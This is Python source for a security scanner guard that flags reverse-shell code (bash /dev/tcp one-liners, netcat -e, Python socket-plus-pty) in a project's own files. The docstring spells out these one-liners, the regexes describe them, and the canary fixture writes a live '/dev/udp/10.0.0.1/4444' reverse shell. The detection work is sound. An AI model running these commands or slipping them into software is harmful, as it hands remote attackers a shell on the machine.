"""Guard: no reverse-shell pattern in source (checklist §8, new item).

A reverse shell is the single most common "proof of compromise" shape a backdoored
dependency, a malicious AI-agent skill, or a compromised contribution ships: code that
connects OUT to an attacker-controlled host and hands it an interactive shell, so the
attacker never has to reach an inbound port. Two independent, high-signal idioms,
adapted from Datadog GuardDog's `threat-network-reverse-shell` source-code rule
(GuardDog screens third-party packages; this guard applies the same signatures to the
target app's own source, where a legitimate reason for either is essentially nil):

  **bash/netcat one-liner (HIGH):** `bash -i >& /dev/tcp/HOST/PORT 0>&1` (or `/dev/udp/`),
  or `nc`/`ncat` invoked with `-e /bin/sh`: the two most-copy-pasted reverse-shell
  one-liners on the internet. Essentially never appears in legitimate application code.

  **Python socket-plus-shell (HIGH):** a raw `socket.socket(...).connect(...)` call with,
  within `_WINDOW` lines of it, either `pty.spawn(`, a `subprocess` call targeting
  `/bin/sh`/`/bin/bash`, or a bare `exec`/`eval` call (in a file that mentions `socket`):
  the classic `s.connect(...); os.dup2(s.fileno(), 0); pty.spawn("/bin/sh")` shape.
  `connect()` alone is completely ordinary (any outbound client does this); it's the
  pairing with a shell-spawn primitive NEAR it that is the signal. A connect and an
  unrelated `exec`/`eval` far apart in one file do not pair (PR #1048 review).

Fires on Python/JS/TS source when `python`/`javascript`/`typescript` is detected. In a
`.sh`/`.bash`/`.zsh` shell script it skips every line `claude-code-compromise`'s own reverse-shell
pattern matches (that guard scans every shell script at CRITICAL, and a second finding under this
id would ignore an owner's existing exception or pragma for it; PR #1048 review). What is left
there is what that pattern misses: the `/dev/udp/` one-liner, and `/dev/tcp/` with a variable
host or port (`/dev/tcp/$HOST/$PORT`), since its pattern needs a literal `host/port`. Suppress an audited case (a maintained
red-team tool) with a whole-file pragma comment anywhere in the file:

    # security: allow-reverse-shell-pattern
"""
from __future__ import annotations

import re
from pathlib import Path

from agentsec.detect import StackProfile
from agentsec.findings import Finding

from .base import (
    CanaryPlant,
    Guard,
    comment_dialect_for,
    is_nonproduct_path,
    iter_files,
    pragma_present,
    read,
    rel,
    strip_hash_comments,
    strip_js_comments,
    strip_python_strings,
)
from .claude_code_compromise import _REVERSE_SHELL as _CCC_REVERSE_SHELL

_SHELL_SUFFIXES = (".sh", ".bash", ".zsh")
_JS_SUFFIXES = (".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs")
_PY_SUFFIXES = (".py", ".pyi")

_BASH_DEV_TCP = re.compile(r"\bbash\s+-i\s*>&\s*/dev/(?:tcp|udp)/", re.IGNORECASE)
_NC_SHELL = re.compile(r"\b(?:nc|ncat)\b[^\n]*-e\s+/bin/(?:ba)?sh\b", re.IGNORECASE)

_PY_CONNECT = re.compile(r"\.\s*connect\s*\(\s*\(")
_PY_PTY_SPAWN = re.compile(r"\bpty\s*\.\s*spawn\s*\(")
_PY_SUBPROCESS_SHELL = re.compile(r"\bsubprocess\s*\.\s*(?:call|Popen|run)\s*\(\s*\[?\s*['\"]\s*/bin/(?:ba)?sh")
_PY_EXEC_EVAL = re.compile(r"(?<!\.)\b(?:exec|eval)\s*\(")

# Lines either side of a `.connect((` that a shell-spawn primitive must fall within (the same
# proximity idea as download_execute_chain's window).
_WINDOW = 15
_PRAGMA = re.compile(r"security:\s*allow-reverse-shell-pattern")

_STANDARDS = ["OWASP:A03", "CWE-506"]


class ReverseShellPatternGuard(Guard):
    id = "reverse-shell-pattern"
    title = "No reverse-shell pattern in source (bash /dev/tcp, netcat -e, Python socket+pty)"
    area = "Code safety"

    # backdoor.sh: bash -i >& /dev/udp/10.0.0.1/4444 0>&1 -> fires
    # reverse-shell-pattern/bash-dev-tcp (HIGH). UDP, not TCP, so the plant does not also fire
    # claude-code-compromise/reverse-shell, which owns the /dev/tcp form in shell scripts.
    canary_plant = CanaryPlant(
        files={
            "backdoor.sh": "#!/bin/bash\nbash -i >& /dev/udp/10.0.0.1/4444 0>&1\n",
        },
        expects=frozenset({"reverse-shell-pattern/bash-dev-tcp"}),
    )

    def applies(self, profile: StackProfile) -> bool:
        return bool({"python", "javascript", "typescript"} & profile.features)

    def run(self, root: Path, profile: StackProfile) -> list[Finding]:
        out: list[Finding] = []
        seen: set[Path] = set()
        for f in iter_files(root, _PY_SUFFIXES + _JS_SUFFIXES + _SHELL_SUFFIXES):
            if f in seen:
                continue
            seen.add(f)
            if is_nonproduct_path(rel(root, f), profile.archive_segments):
                continue
            out.extend(self._scan(root, f))
        return out

    def _scan(self, root: Path, f: Path) -> list[Finding]:
        suffix = f.suffix.lower()
        text = read(f)
        if pragma_present(_PRAGMA, text, dialect=comment_dialect_for(f)):
            return []
        if suffix in _SHELL_SUFFIXES:
            code = strip_hash_comments(text)
            # A line claude-code-compromise's pattern matches is its finding (it reads raw lines).
            owned = frozenset(
                i for i, ln in enumerate(text.splitlines(), start=1) if _CCC_REVERSE_SHELL.search(ln)
            )
            return self._scan_shell_idioms(root, f, code, skip=owned)
        if suffix in _PY_SUFFIXES:
            code = strip_python_strings(text, filename=f)
            lines = [ln if not ln.lstrip().startswith("#") else "" for ln in code.splitlines()]
            code = "\n".join(lines)
            out = self._scan_shell_idioms(root, f, code)
            out.extend(self._scan_python_socket_shell(root, f, code))
            return out
        # JS/TS: shell one-liner only (a .js/.ts build script could embed a shell string).
        code = strip_js_comments(text, strip_strings=False)
        return self._scan_shell_idioms(root, f, code)

    def _scan_shell_idioms(
        self, root: Path, f: Path, code: str, *, skip: frozenset[int] = frozenset()
    ) -> list[Finding]:
        out: list[Finding] = []
        for i, line in enumerate(code.splitlines(), start=1):
            if i in skip:
                continue
            if _BASH_DEV_TCP.search(line):
                out.append(self._finding(
                    root, f, i, "bash-dev-tcp",
                    "A `bash -i >& /dev/tcp/HOST/PORT` (or /dev/udp/) one-liner opens an "
                    "interactive shell piped to a remote socket: the single most copy-pasted "
                    "reverse-shell idiom.",
                ))
            elif _NC_SHELL.search(line):
                out.append(self._finding(
                    root, f, i, "netcat-exec-shell",
                    "`nc`/`ncat` invoked with `-e /bin/sh` (or `/bin/bash`) hands a shell "
                    "directly to whatever host the connection reaches: a classic reverse-shell "
                    "one-liner.",
                ))
        return out

    def _scan_python_socket_shell(self, root: Path, f: Path, code: str) -> list[Finding]:
        if not _PY_CONNECT.search(code):
            return []
        mentions_socket = "socket" in code
        lines = code.splitlines()
        for i, line in enumerate(lines):
            if not _PY_CONNECT.search(line):
                continue
            # Joined, so a call broken across lines (`subprocess.call(\n ['/bin/sh'`) still matches.
            window = "\n".join(lines[max(0, i - _WINDOW):i + _WINDOW + 1])
            if (
                _PY_PTY_SPAWN.search(window)
                or _PY_SUBPROCESS_SHELL.search(window)
                or (mentions_socket and _PY_EXEC_EVAL.search(window))
            ):
                return [self._finding(
                    root, f, i + 1, "python-socket-shell",
                    f"A raw `socket.connect(...)` call has a shell-spawn primitive within {_WINDOW} "
                    "lines (`pty.spawn`, a `/bin/sh` subprocess target, or a bare `exec`/`eval`): "
                    "the classic connect-then-spawn-shell reverse-shell shape.",
                )]
        return []

    def _finding(self, root: Path, f: Path, line: int, rule_suffix: str, message: str) -> Finding:
        return Finding(
            check_id=self.id,
            severity="high",
            title=self.title,
            location=f"{rel(root, f)}:{line}",
            message=message,
            remediation=(
                "Remove the reverse-shell code. If this is genuinely a maintained offensive-"
                "security or red-team tool, mark it explicitly with the inline suppress pragma "
                "and keep it isolated from application code paths."
            ),
            rule=f"reverse-shell-pattern/{rule_suffix}",
            standards=list(_STANDARDS),
        )
